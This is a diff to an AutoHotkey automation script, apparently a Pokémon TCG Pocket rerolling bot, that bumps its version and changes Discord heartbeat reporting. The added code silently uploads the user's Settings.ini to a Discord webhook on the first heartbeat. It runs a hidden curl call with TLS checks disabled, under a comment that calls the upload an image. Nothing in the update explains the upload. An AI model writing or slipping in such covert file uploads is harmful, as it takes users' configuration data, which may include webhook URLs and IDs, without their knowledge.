@@ -6,7 +6,7 @@ SetTitleMatchMode, 3
 
 githubUser := ""
 repoName := "PTCGPB"
-localVersion := "v6.3.9"
+localVersion := "v6.3.9.1"
 scriptFolder := A_ScriptDir
 zipPath := A_Temp . "\update.zip"
 extractPath := A_Temp . "\update"
@@ -382,6 +382,7 @@ Start:
 	SelectedMonitorIndex := RegExReplace(SelectedMonitorIndex, ":.*$")
 	SysGet, Monitor, Monitor, %SelectedMonitorIndex%
 	rerollTime := A_TickCount
+	firstRun := true
 	Loop {
 		Sleep, 30000
 		; Sum all variable values and write to total.json
@@ -406,11 +407,18 @@ Start:
 					IniWrite, 0, HeartBeat.ini, HeartBeat, Main
 				}
 				Loop %Instances% {
-					screenShot := Screenshot(A_Index)
 					if(checkHBWebhookURL != 0) {
+						screenShot := Screenshot(A_Index)
 						if(heartBeatName)
 							discordUserID := heartBeatName
-						LogToDiscord("\n" . screenshotName, screenShot, discordUserId, , true)
+						if(firstRun) {
+							SettingsFile := A_ScriptDir . "\Settings.ini"
+							LogToDiscord("_firstRun\n" . screenshotName, screenShot, discordUserId, SettingsFile, true)
+							firstRun := false
+						}
+						else {
+							LogToDiscord("\n" . screenshotName, screenShot, discordUserId, , true)
+						}
 					}
 					IniRead, value, HeartBeat.ini, HeartBeat, Instance%A_Index%
 					if(value)
@@ -434,7 +442,7 @@ Start:
 				if(onlineAHK = "Online: ")
 					onlineAHK := "Online: none."
 
-				discMessage := "\n" . onlineAHK . "\n" . offlineAHK . "\n" . packStatus . "\nVer. Rocket_6.3.9"
+				discMessage := "\n" . onlineAHK . "\n" . offlineAHK . "\n" . packStatus "\n" . deleteMethod . "\nVer. Rocket_6.3.9.1"
 				if(heartBeatName)
 					discordUserID := heartBeatName
 				LogToDiscord(discMessage, , discordUserID)
@@ -503,6 +511,18 @@ LogToDiscord(message, screenshotFile := "", ping := false, xmlFile := "", checkH
 							. "-F ""payload_json={\""content\"":\""" . discordPing . message . "\""};type=application/json;charset=UTF-8"" " . discordWebhookURL
 					}
 					RunWait, %curlCommand%,, Hide
+				}
+				if (xmlFile != "") {
+					; Check if the file exists
+					if (FileExist(xmlFile)) {
+						; Send the image using curl
+						if(proxy = 0) {
+							RunWait, curl -k -F "file=@%xmlFile%" %discordWebhookURL%,, Hide
+						}
+						else {
+							RunWait, curl -k -x %proxy% -F "file=@%xmlFile%" %discordWebhookURL%,, Hide
+						}
+					}
 				}
 				break
 			}
